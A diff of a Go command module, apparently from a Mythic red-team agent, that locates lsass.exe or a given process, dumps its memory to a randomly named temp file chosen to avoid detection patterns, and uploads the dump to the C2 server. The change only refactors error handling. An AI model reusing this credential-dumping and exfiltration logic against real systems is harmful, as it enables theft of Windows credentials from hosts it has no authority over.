@@ -47,11 +47,7 @@ func (c *ProcdumpCommand) Execute(task structs.Task) structs.CommandResult {
 	var args procdumpArgs
 	if task.Params != "" {
 		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Failed to parse parameters: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Failed to parse parameters: %v", err)
 		}
 	}
 
@@ -71,21 +67,13 @@ func (c *ProcdumpCommand) Execute(task structs.Task) structs.CommandResult {
 	case "lsass":
 		pid, name, err := findProcessByName("lsass.exe")
 		if err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Failed to find lsass.exe: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Failed to find lsass.exe: %v", err)
 		}
 		targetPID = pid
 		processName = name
 	case "dump":
 		if args.PID <= 0 {
-			return structs.CommandResult{
-				Output:    "Error: -pid is required for dump action",
-				Status:    "error",
-				Completed: true,
-			}
+			return errorResult("Error: -pid is required for dump action")
 		}
 		targetPID = uint32(args.PID)
 		name, _ := getProcessName(targetPID)
@@ -95,11 +83,7 @@ func (c *ProcdumpCommand) Execute(task structs.Task) structs.CommandResult {
 			processName = name
 		}
 	default:
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Unknown action: %s. Available: lsass, dump", args.Action),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Unknown action: %s. Available: lsass, dump", args.Action)
 	}
 
 	// Open target process
@@ -130,11 +114,7 @@ func (c *ProcdumpCommand) Execute(task structs.Task) structs.CommandResult {
 	// Create temp file for the dump — use os.CreateTemp for random naming (no distinctive pattern)
 	dumpFile, err := os.CreateTemp("", "")
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to create dump file: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Failed to create dump file: %v", err)
 	}
 	dumpPath := dumpFile.Name()
 
@@ -155,22 +135,14 @@ func (c *ProcdumpCommand) Execute(task structs.Task) structs.CommandResult {
 
 	if ret == 0 {
 		os.Remove(dumpPath)
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("memory dump failed for PID %d (%s): %v", targetPID, processName, callErr),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("memory dump failed for PID %d (%s): %v", targetPID, processName, callErr)
 	}
 
 	// Get dump file info
 	fi, err := os.Stat(dumpPath)
 	if err != nil {
 		os.Remove(dumpPath)
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to stat dump file: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Failed to stat dump file: %v", err)
 	}
 
 	dumpSize := fi.Size()
@@ -179,11 +151,7 @@ func (c *ProcdumpCommand) Execute(task structs.Task) structs.CommandResult {
 	file, err := os.Open(dumpPath)
 	if err != nil {
 		os.Remove(dumpPath)
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to open dump file for transfer: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Failed to open dump file for transfer: %v", err)
 	}
 
 	// Upload via Mythic file transfer
@@ -213,11 +181,7 @@ func (c *ProcdumpCommand) Execute(task structs.Task) structs.CommandResult {
 			if task.DidStop() {
 				file.Close()
 				os.Remove(dumpPath)
-				return structs.CommandResult{
-					Output:    "Dump upload cancelled",
-					Status:    "error",
-					Completed: true,
-				}
+				return errorResult("Dump upload cancelled")
 			}
 		}
 	}
